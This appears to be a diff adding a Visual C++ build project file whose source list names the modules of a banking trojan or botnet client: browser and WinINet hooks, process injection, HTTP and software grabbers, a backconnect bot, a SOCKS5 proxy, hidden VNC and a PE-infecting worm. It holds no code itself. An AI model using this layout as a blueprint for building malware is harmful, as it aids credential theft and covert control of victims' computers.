@@ -1,0 +1,118 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{892C5394-87E2-4077-AA1B-1D58871BD0D5}</ProjectGuid>
+    <RootNamespace>client</RootNamespace>
+    <Keyword>Win32Proj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Utility</ConfigurationType>
+    <CharacterSet>Unicode</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup>
+    <_ProjectFileVersion>10.0.30319.1</_ProjectFileVersion>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(SolutionDir)$(Configuration)\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(Configuration)\</IntDir>
+    <ExtensionsToDeleteOnClean Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" />
+    <PreBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</PreBuildEventUseInBuild>
+    <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</PostBuildEventUseInBuild>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <BuildLog>
+      <Path>
+      </Path>
+    </BuildLog>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="common.cpp" />
+    <ClCompile Include="filesearch.cpp" />
+    <ClCompile Include="core.cpp" />
+    <ClCompile Include="corecontrol.cpp" />
+    <ClCompile Include="corehook.cpp" />
+    <ClCompile Include="coreinject.cpp" />
+    <ClCompile Include="coreinstall.cpp" />
+    <ClCompile Include="dynamicconfig.cpp" />
+    <ClCompile Include="localconfig.cpp" />
+    <ClCompile Include="localsettings.cpp" />
+    <ClCompile Include="winapitables.cpp" />
+    <ClCompile Include="certstorehook.cpp" />
+    <ClCompile Include="nspr4hook.cpp" />
+    <ClCompile Include="sockethook.cpp" />
+    <ClCompile Include="userhook.cpp" />
+    <ClCompile Include="wininethook.cpp" />
+    <ClCompile Include="worm\peinfector.cpp" />
+    <ClCompile Include="worm\worm.cpp" />
+    <ClCompile Include="backconnectbot.cpp" />
+    <ClCompile Include="socks5server.cpp" />
+    <ClCompile Include="tcpserver.cpp" />
+    <ClCompile Include="report.cpp" />
+    <ClCompile Include="httpgrabber.cpp" />
+    <ClCompile Include="softwaregrabber.cpp" />
+    <ClCompile Include="cryptedstrings.cpp" />
+    <ClCompile Include="osenv.cpp" />
+    <ClCompile Include="remotescript.cpp" />
+    <ClCompile Include="screenshot.cpp" />
+    <ClCompile Include="windowstation.cpp" />
+    <ClCompile Include="vnc\rfb.cpp" />
+    <ClCompile Include="vnc\vnckeyboard.cpp" />
+    <ClCompile Include="vnc\vncmouse.cpp" />
+    <ClCompile Include="vnc\vncpaint.cpp" />
+    <ClCompile Include="vnc\vncserver.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="cryptedstrings.txt" />
+    <None Include="worm\peloader32.asm" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="defines.h" />
+    <ClInclude Include="filesearch.h" />
+    <ClInclude Include="core.h" />
+    <ClInclude Include="corecontrol.h" />
+    <ClInclude Include="corehook.h" />
+    <ClInclude Include="coreinject.h" />
+    <ClInclude Include="coreinstall.h" />
+    <ClInclude Include="dynamicconfig.h" />
+    <ClInclude Include="localconfig.h" />
+    <ClInclude Include="localsettings.h" />
+    <ClInclude Include="winapitables.h" />
+    <ClInclude Include="certstorehook.h" />
+    <ClInclude Include="nspr4hook.h" />
+    <ClInclude Include="sockethook.h" />
+    <ClInclude Include="userhook.h" />
+    <ClInclude Include="wininethook.h" />
+    <ClInclude Include="worm\peinfector.h" />
+    <ClInclude Include="worm\worm.h" />
+    <ClInclude Include="backconnectbot.h" />
+    <ClInclude Include="socks5server.h" />
+    <ClInclude Include="tcpserver.h" />
+    <ClInclude Include="report.h" />
+    <ClInclude Include="httpgrabber.h" />
+    <ClInclude Include="softwaregrabber.h" />
+    <ClInclude Include="cryptedstrings.h" />
+    <ClInclude Include="osenv.h" />
+    <ClInclude Include="remotescript.h" />
+    <ClInclude Include="screenshot.h" />
+    <ClInclude Include="windowstation.h" />
+    <ClInclude Include="vnc\defines.h" />
+    <ClInclude Include="vnc\rfb.h" />
+    <ClInclude Include="vnc\vncserver.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
